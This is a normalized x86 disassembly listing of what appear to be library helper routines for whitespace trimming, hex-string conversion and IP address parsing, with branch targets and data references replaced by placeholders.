push ecx
call sub_1001e730
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
cmp [ ebp ] 0x0
je r-xdata
xor eax eax
mov al [ esi ]
push eax
call isspace
add esp 0x4
test eax eax
je r-xdata
mov [ ebx ] 0x0
mov al [ esi ]
test al al
je r-xdata
push 0x10f
jmp r-xdata
xor eax eax
mov al [ esi ]
push eax
call isspace
add esp 0x4
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx ] 0x0
mov al [ esi ]
test al al
mov [ esp + 0x14 ] 0x1
mov ebp esi
je r-xdata
test ebp ebp
jne r-xdata
cmp ebp esi
je r-xdata
dec esi
cmp esi ebp
jne r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov dl [ esi ]
push edx
call isspace
add esp 0x4
test eax eax
je r-xdata
push r--data
push 0x6c
cmp [ esi ] 0x0
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
cmp [ ebp ] 0x0
je r-xdata
xor ecx ecx
mov cl [ ebp ]
push ecx
call isspace
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
xor esi esi
xor edi edi
xor ebx ebx
test eax eax
je r-xdata
mov [ esi + 0x1 ] 0x0
jmp r-xdata
test eax eax
mov [ esp + 0x24 ] eax
lea esi [ ebx + 0x1 ]
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ ecx + esi - 0x1 ]
cmp edi esi
je r-xdata
push 0x12b
push r--data
push 0x6d
jmp r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea esi [ ecx + ebp - 0x1 ]
cmp esi ebp
je r-xdata
mov al [ ebp + 0x1 ]
inc ebp
test al al
jne r-xdata
push ebp
call sub_100266f0
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov ecx eax
push ecx
call sub_100266f0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push 0x11b
jmp r-xdata
push eax
xor edi edi
call sub_100266f0
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ ecx + esi - 0x1 ]
cmp edi esi
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor ecx ecx
mov cl [ edi ]
push ecx
call isspace
add esp 0x4
test eax eax
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
xor edx edx
mov dl [ esi ]
push edx
call isspace
add esp 0x4
test eax eax
je r-xdata
push 0x60
push r--data
push 0x41
push 0x69
push 0x22
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
push 0x58
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push 0x60
push r--data
push 0x41
push 0x69
push 0x22
call sub_1001de60
add esp 0x14
test edi edi
je r-xdata
push 0x58
push r--data
push 0xc
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
je r-xdata
mov al [ esi ]
neg al
sbb eax eax
and eax esi
xor eax eax
mov al [ edi ]
push eax
call isspace
add esp 0x4
test eax eax
je r-xdata
test esi esi
mov [ esp + 0x24 ] esi
je r-xdata
cmp esi edi
je r-xdata
dec edi
cmp edi esi
jne r-xdata
test ebp ebp
je r-xdata
cmp ebp esi
je r-xdata
dec esi
cmp esi ebp
jne r-xdata
test edi edi
je r-xdata
push esi
call sub_1001d740
add esp 0x4
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
push edi
call sub_1001d740
add esp 0x4
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
cmp esi edi
je r-xdata
dec edi
cmp edi esi
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
mov [ edi + 0x1 ] 0x0
jmp r-xdata
mov eax [ esp + 0x24 ]
xor esi esi
xor edi edi
xor ebx ebx
test eax eax
je r-xdata
mov [ esi + 0x1 ] 0x0
jmp r-xdata
test ebx ebx
je r-xdata
push edi
call sub_1001d740
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] ebx
mov edx [ esp + 0x10 ]
push esi
push edx
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
call sub_1001e3c0
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
push ebp
call sub_1001d740
add esp 0x4
mov [ edi ] 0x0
mov [ edi + 0x4 ] ebp
mov [ edi + 0x8 ] 0x0
mov ecx [ esp + 0x10 ]
push edi
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
call sub_1001e3c0
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov [ edi + 0x1 ] 0x0
jmp r-xdata
push ebp
call sub_100266f0
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
push eax
call sub_100266f0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_1001d740
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push ebx
call sub_1001d740
add esp 0x4
jmp r-xdata
push 0x60
push r--data
push 0x41
push 0x69
push 0x22
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
push 0x58
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
test edi edi
je r-xdata
push esi
call sub_1001d740
add esp 0x4
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
push edi
call sub_1001d740
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] ebx
mov ecx [ esp + 0x10 ]
push esi
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
call sub_1001e3c0
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x24 ] 0x0
mov ebx edx
lea esi [ edx + 0x1 ]
jmp r-xdata
push ebx
call sub_1001d740
add esp 0x4
sub_10056e20
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
je r-xdata
xor eax eax
pop esi
retn
xor eax eax
mov al [ esi ]
push eax
call isspace
add esp 0x4
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ ecx + esi - 0x1 ]
cmp edi esi
je r-xdata
mov al [ esi ]
pop edi
neg al
sbb eax eax
and eax esi
pop esi
retn
xor ecx ecx
mov cl [ edi ]
push ecx
call isspace
add esp 0x4
test eax eax
je r-xdata
cmp esi edi
je r-xdata
dec edi
cmp edi esi
jne r-xdata
mov [ edi + 0x1 ] 0x0
mov al [ esi ]
pop edi
neg al
sbb eax eax
and eax esi
pop esi
retn
sub_10056ea0
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
test ebx ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
push 0x172
lea eax [ esi + esi * 2 + 0x1 ]
push r--data
push eax
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
test esi esi
mov ecx edi
mov edx ebx
jle r-xdata
push 0x173
push r--data
push 0x41
push 0x6f
push 0x22
call sub_1001de60
add esp 0x14
mov eax edi
pop edi
pop esi
mov [ ecx - 0x1 ] 0x0
pop ebx
retn
xor eax eax
mov al [ edx ]
shr eax 0x4
inc ecx
mov al [ eax + r--data ]
mov [ ecx - 0x1 ] al
mov al [ edx ]
and eax 0xf
inc ecx
inc ecx
inc edx
mov al [ eax + r--data ]
dec esi
mov [ ecx - 0x2 ] al
mov [ ecx - 0x1 ] 0x3a
jne r-xdata
sub_10056f30
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
test esi esi
push edi
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
push 0x190
[ edi ]
not ecx
dec ecx
push r--data
sar ecx 0x1
push ecx
call sub_1001d4c0
mov ecx eax
add esp 0xc
test ecx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
push 0x18d
push r--data
push 0x6b
push 0x71
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov al [ esi ]
mov edi esi
test al al
mov ebp ecx
je r-xdata
push 0x1b4
push r--data
push 0x41
push 0x71
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov bl [ edi ]
inc edi
cmp bl 0x3a
mov [ esp + 0x14 ] bl
je r-xdata
pop edi
pop esi
pop ebp
mov eax ecx
pop ebx
add esp 0x8
retn
sub ebp ecx
mov [ eax ] ebp
cmp [ edi ] 0x0
jne r-xdata
mov al [ edi ]
inc edi
test al al
mov [ esp + 0x10 ] al
je r-xdata
push 0x19c
push r--data
push 0x70
push 0x71
push 0x22
call sub_1001de60
mov eax [ esp + 0x30 ]
push eax
call sub_1001d740
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov esi [ esp + 0x14 ]
and esi 0xff
push esi
call isupper
add esp 0x4
test eax eax
je r-xdata
mov esi [ esp + 0x10 ]
and esi 0xff
push esi
call isupper
add esp 0x4
test eax eax
je r-xdata
push esi
call tolower
add esp 0x4
mov bl al
mov al [ esp + 0x10 ]
push esi
call tolower
add esp 0x4
jmp r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x39
ja r-xdata
cmp bl 0x30
jb r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_1001d740
push 0x1b9
push r--data
push 0x71
push 0x71
push 0x22
call sub_1001de60
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
cmp bl 0x66
ja r-xdata
add bl 0xd0
jmp r-xdata
add bl 0xa9
cmp al 0x30
jb r-xdata
cmp al 0x61
jb r-xdata
cmp al 0x39
ja r-xdata
cmp al 0x66
ja r-xdata
add al 0xd0
jmp r-xdata
add al 0xa9
mov ecx [ esp + 0x1c ]
shl bl 0x4
or bl al
mov [ ebp ] bl
inc ebp
sub_100570e0
mov edx [ esp + 0x8 ]
push esi
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edi [ esp + 0xc ]
not ecx
dec ecx
mov esi ecx
push esi
push edx
push edi
call strncmp
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov al [ esi + edi ]
test al al
je r-xdata
xor eax eax
cmp al 0x2e
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
sub_10057120
mov eax 0x38
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x44 ]
push edi
push 0x3a
push esi
call strchr
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x10 ]
push ecx
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x50 ]
push eax
push ecx
push r--data
push esi
call sscanf
add esp 0x18
cmp eax 0x4
jne r-xdata
lea eax [ esp + 0x28 ]
mov [ esp + 0x38 ] 0x0
push eax
push sub_10057760
push 0x0
push 0x3a
push esi
mov [ esp + 0x50 ] 0xffffffff
mov [ esp + 0x54 ] 0x0
call sub_10061130
add esp 0x14
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x38
retn
mov ebx [ esp + 0x48 ]
test ebx ebx
jl r-xdata
mov edx [ esp + 0x3c ]
cmp edx 0xffffffff
jne r-xdata
cmp ebx 0xff
jg r-xdata
mov ebx [ esp + 0x38 ]
cmp ebx 0x10
je r-xdata
cmp [ esp + 0x38 ] 0x10
je r-xdata
mov edx [ esp + 0xc ]
test edx edx
jl r-xdata
mov eax [ esp + 0x40 ]
cmp eax 0x3
jg r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x30 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x34 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] eax
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x38
retn
cmp edx 0xff
jg r-xdata
jne r-xdata
call sub_1002ef80
mov edi eax
test edi edi
jne r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
jl r-xdata
cmp eax 0x2
jne r-xdata
test ebx ebx
jg r-xdata
lea edx [ esp + 0x18 ]
push esi
push edx
push edi
call sub_10036a60
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x38
retn
cmp ecx 0xff
jg r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x38
retn
push edi
call sub_1002ef90
add esp 0x4
mov eax [ esp + 0x14 ]
test eax eax
jl r-xdata
cmp edx ebx
je r-xdata
mov ecx edx
lea esi [ esp + 0x28 ]
mov eax ecx
lea edi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x10
lea edi [ esp + edx + 0x18 ]
sub ecx ebx
mov esi ecx
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
cmp ebx edx
[ edi ]
je r-xdata
cmp edx ebx
jne r-xdata
test edx edx
jl r-xdata
cmp eax 0xff
jg r-xdata
mov esi 0x10
jmp r-xdata
mov ecx ebx
lea esi [ esp + edx + 0x28 ]
sub ecx edx
sub edx ebx
lea edi [ esp + edx + 0x28 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi 0x10
jmp r-xdata
jmp r-xdata
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] dl
mov [ esp + 0x1a ] cl
mov [ esp + 0x1b ] al
mov esi 0x4
sub_10057330
mov eax 0x4c
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x5c ]
push edi
push 0x2f
push esi
call strchr
mov ebp eax
xor ebx ebx
add esp 0x8
cmp ebp ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x4c
retn
push esi
call sub_100266f0
mov edi eax
add esp 0x4
cmp edi ebx
mov [ esp + 0x60 ] edi
je r-xdata
sub eax esi
push 0x3a
add ebp eax
push edi
mov [ ebp ] bl
inc ebp
call strchr
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x18 ]
push ecx
lea eax [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x18 ]
push eax
push ecx
push r--data
push edi
call sscanf
add esp 0x18
cmp eax 0x4
jne r-xdata
lea ecx [ esp + 0x20 ]
mov [ esp + 0x30 ] ebx
push ecx
push sub_10057760
push ebx
push 0x3a
push edi
mov [ esp + 0x48 ] 0xffffffff
mov [ esp + 0x4c ] ebx
call sub_10061130
add esp 0x14
test eax eax
je r-xdata
push edi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4c
retn
mov ebx [ esp + 0x10 ]
test ebx ebx
jl r-xdata
mov edx [ esp + 0x34 ]
cmp edx 0xffffffff
jne r-xdata
cmp ebx 0xff
jg r-xdata
mov ebx [ esp + 0x30 ]
cmp ebx 0x10
je r-xdata
cmp [ esp + 0x30 ] 0x10
je r-xdata
mov edx [ esp + 0x14 ]
test edx edx
jl r-xdata
mov eax [ esp + 0x38 ]
cmp eax 0x3
jg r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x2c ]
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] edx
mov [ esp + 0x48 ] eax
mov [ esp + 0x10 ] 0x10
jmp r-xdata
cmp edx 0xff
jg r-xdata
jne r-xdata
mov edx [ esp + 0x10 ]
push 0x3a
push ebp
lea ebx [ esp + edx + 0x44 ]
call strchr
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
jl r-xdata
cmp eax 0x2
jne r-xdata
test ebx ebx
jg r-xdata
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x64 ]
push eax
lea edx [ esp + 0x24 ]
push ecx
push edx
push r--data
push ebp
call sscanf
add esp 0x18
cmp eax 0x4
jne r-xdata
lea eax [ esp + 0x20 ]
xor esi esi
push eax
push sub_10057760
push esi
push 0x3a
push ebp
mov [ esp + 0x44 ] esi
mov [ esp + 0x48 ] 0xffffffff
mov [ esp + 0x4c ] esi
call sub_10061130
add esp 0x14
test eax eax
je r-xdata
cmp ecx 0xff
jg r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
jmp r-xdata
xor esi esi
jmp r-xdata
mov edx [ esp + 0x1c ]
test edx edx
jl r-xdata
push edi
call sub_1001d740
add esp 0x4
test esi esi
je r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
cmp edx 0xffffffff
jne r-xdata
mov eax [ esp + 0x1c ]
test eax eax
jl r-xdata
cmp edx ebx
je r-xdata
mov ecx edx
lea esi [ esp + 0x20 ]
mov eax ecx
lea edi [ esp + 0x3c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x10
lea edi [ esp + edx + 0x3c ]
sub ecx ebx
mov esi ecx
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
cmp ebx edx
[ edi ]
je r-xdata
cmp edx ebx
jne r-xdata
test edx edx
jl r-xdata
cmp edx 0xff
jg r-xdata
cmp [ esp + 0x10 ] esi
jne r-xdata
cmp eax 0x10
je r-xdata
cmp eax 0x10
je r-xdata
cmp eax 0xff
jg r-xdata
mov edi [ esp + 0x60 ]
mov [ esp + 0x10 ] 0x10
jmp r-xdata
mov ecx ebx
lea esi [ esp + edx + 0x20 ]
sub ecx edx
sub edx ebx
lea edi [ esp + edx + 0x4c ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax [ esp + 0x60 ]
test eax eax
jl r-xdata
call sub_1002ef80
mov edi eax
test edi edi
je r-xdata
mov ecx [ esp + 0x38 ]
cmp ecx 0x3
jg r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ ebx ] ecx
mov ecx [ esp + 0x2c ]
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] ecx
mov esi 0x10
jmp r-xdata
jmp r-xdata
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] dl
mov [ esp + 0x3e ] cl
mov [ esp + 0x3f ] al
mov [ esp + 0x10 ] 0x4
cmp eax 0xff
jg r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x3c ]
add esi eax
push esi
push ecx
push edi
call sub_10036a60
add esp 0xc
test eax eax
je r-xdata
jne r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
jl r-xdata
push edi
call sub_1002ef90
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4c
retn
cmp ecx 0x2
jne r-xdata
cmp eax esi
jg r-xdata
cmp ecx 0xff
jg r-xdata
cmp edx esi
je r-xdata
cmp edx esi
je r-xdata
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jl r-xdata
cmp edx eax
je r-xdata
mov ecx edx
lea esi [ esp + 0x20 ]
mov ebp ecx
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x10
lea edi [ edx + ebx ]
sub ecx eax
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x34 ]
cmp edx eax
je r-xdata
cmp edx eax
jne r-xdata
cmp edx esi
jl r-xdata
cmp eax 0xff
jg r-xdata
mov edi [ esp + 0x60 ]
mov esi 0x10
jmp r-xdata
mov ecx edx
lea esi [ esp + eax + 0x20 ]
sub ecx eax
sub eax edx
lea edi [ eax + ebx + 0x10 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov [ ebx ] dl
mov dl [ esp + 0x60 ]
mov [ ebx + 0x1 ] dl
mov [ ebx + 0x2 ] cl
mov [ ebx + 0x3 ] al
mov esi 0x4
sub_10057760
mov eax 0xc
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x20 ]
push edi
mov edi [ esi + 0x10 ]
cmp edi 0x10
mov [ esp + 0xc ] edi
jne r-xdata
mov eax [ esp + 0x20 ]
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xc
retn
cmp eax 0x4
jle r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x1c ]
xor ecx ecx
lea ebx [ eax - 0x1 ]
cmp edi 0xc
jle r-xdata
cmp eax edi
je r-xdata
mov [ esi + 0x14 ] edi
cmp al 0x41
jb r-xdata
cmp al 0x39
ja r-xdata
mov ecx [ esp + 0x1c ]
cmp [ ecx + eax ] 0x0
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xc
retn
mov eax [ esi + 0x18 ]
pop edi
inc eax
mov [ esi + 0x18 ] eax
pop esi
mov eax 0x1
pop ebx
add esp 0xc
retn
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xc
retn
cmp al 0x61
jb r-xdata
cmp al 0x46
ja r-xdata
mov eax [ esp + 0x24 ]
and eax 0xff
sub eax 0x30
jmp r-xdata
lea eax [ esp + 0x14 ]
lea edx [ esp + 0x10 ]
push eax
push edx
lea eax [ esp + 0x28 ]
lea edx [ esp + 0x24 ]
push eax
push edx
push r--data
push ecx
call sscanf
add esp 0x18
cmp eax 0x4
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xc
retn
cmp al 0x66
ja r-xdata
mov eax [ esp + 0x24 ]
and eax 0xff
sub eax 0x37
jmp r-xdata
or ecx eax
mov eax ebx
dec ebx
test eax eax
jne r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
jl r-xdata
mov eax [ esp + 0x24 ]
and eax 0xff
sub eax 0x57
mov al [ edx ]
inc edx
shl ecx 0x4
cmp al 0x30
mov [ esp + 0x24 ] al
jb r-xdata
mov edx ecx
mov [ edi + esi + 0x1 ] cl
shr edx 0x8
mov [ edi + esi ] dl
mov eax [ esi + 0x10 ]
add eax 0x2
pop edi
mov [ esi + 0x10 ] eax
pop esi
mov eax 0x1
pop ebx
add esp 0xc
retn
cmp ebx 0xff
jg r-xdata
mov edx [ esp + 0x20 ]
test edx edx
jl r-xdata
cmp edx 0xff
jg r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
jl r-xdata
cmp ecx 0xff
jg r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jl r-xdata
cmp eax 0xff
jg r-xdata
mov esi [ esp + 0xc ]
mov edi [ esp + 0x24 ]
mov [ esi + edi ] bl
mov edi esi
mov esi [ esp + 0x24 ]
mov [ edi + esi + 0x1 ] dl
mov [ edi + esi + 0x2 ] cl
mov [ edi + esi + 0x3 ] al
mov eax [ esi + 0x10 ]
add eax 0x4
pop edi
mov [ esi + 0x10 ] eax
pop esi
mov eax 0x1
pop ebx
add esp 0xc
retn
sub_10057900
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
test eax eax
push edi
jne r-xdata
mov ebx [ esp + 0x18 ]
xor edi edi
push ebx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebp [ esp + 0x1c ]
cmp [ edx ] 0x2b
jne r-xdata
cmp cl 0x3a
je r-xdata
xor ecx ecx
or ecx 0xffffffff
inc edx
jmp r-xdata
mov cl [ esi + 0x1 ]
inc esi
test cl cl
je r-xdata
cmp cl 0x2c
je r-xdata
push ebx
inc edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
mov eax [ eax + 0x8 ]
push ecx
mov ecx [ esp + 0x18 ]
push 0xffffffff
push 0xffffffff
push eax
push ebp
push edx
push ecx
call sub_1005d590
add esp 0x1c
test eax eax
je r-xdata
mov edx esi
cmp cl 0x2e
je r-xdata
push edi
push ebx
call sub_1001e7c0
mov edx [ eax + 0x4 ]
add esp 0x8
mov esi edx
mov cl [ edx ]
test cl cl
je r-xdata
mov cl [ esi + 0x1 ]
inc esi
test cl cl
jne r-xdata
jmp r-xdata
sub_100579b0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x14 ]
push eax
push edi
push ecx
push esi
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov eax [ edi + 0xc ]
test eax eax
mov eax sub_10038960
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
push edi
push esi
push esi
call eax
add esp 0xc
pop edi
pop esi
retn
mov eax sub_10038680
sub_10057a10
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
push esi
call sub_10038680
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push edi
mov edi [ esp + 0x18 ]
push edx
push edi
push esi
push esi
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
jne r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov eax [ edi + 0xc ]
test eax eax
mov eax sub_10038960
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
push edi
push esi
push esi
call eax
add esp 0xc
pop edi
pop esi
retn
mov eax sub_10038680
sub_10057a80
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
push eax
push ecx
push esi
call sub_10038720
add esp 0xc
test eax eax
jne r-xdata
mov edi [ esp + 0x18 ]
push edi
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
pop edi
pop esi
retn
pop edi
mov eax 0x1
pop esi
retn
push edi
push esi
push esi
call sub_100387f0
add esp 0xc
pop edi
pop esi
retn
sub_10057ad0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
push esi
call sub_10038960
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
pop esi
retn
mov eax 0x1
pop esi
retn
mov edx [ esp + 0x14 ]
push edx
push esi
push esi
call sub_10038680
add esp 0xc
pop esi
retn
sub_10057b10
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x24 ]
xor ebp ebp
push edi
call sub_1002dd20
push edi
call sub_1002de70
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push edi
call sub_1002de00
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
cmp eax ecx
push edi
jne r-xdata
push ecx
push eax
push esi
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
push eax
push esi
call sub_1005a220
add esp 0xc
test eax eax
je r-xdata
mov ebx [ esp + 0x20 ]
push edi
push ebx
push esi
mov esi [ esp + 0x20 ]
push esi
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ebp 0x1
mov eax [ ebx + 0xc ]
test eax eax
mov eax sub_10038960
jne r-xdata
push ebx
push esi
push esi
call eax
add esp 0xc
test eax eax
je r-xdata
mov eax sub_10038680
sub_10057bb0
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x18 ]
push edi
push eax
push esi
call sub_1005a220
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
push edi
push ecx
push esi
push esi
push 0x0
call sub_10057d10
add esp 0x14
pop edi
pop esi
retn
pop edi
pop esi
retn
sub_10057bf0
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
push eax
push esi
call sub_10035d30
add esp 0x8
test eax eax
jne r-xdata
mov edi [ esp + 0x14 ]
push edi
push esi
call sub_1002a000
add esp 0x8
test eax eax
jl r-xdata
pop edi
pop esi
retn
pop edi
mov eax 0x1
pop esi
retn
push edi
push esi
push esi
call sub_10038960
add esp 0xc
pop edi
pop esi
retn
sub_10057c40
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi eax
je r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
jle r-xdata
push eax
push edi
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
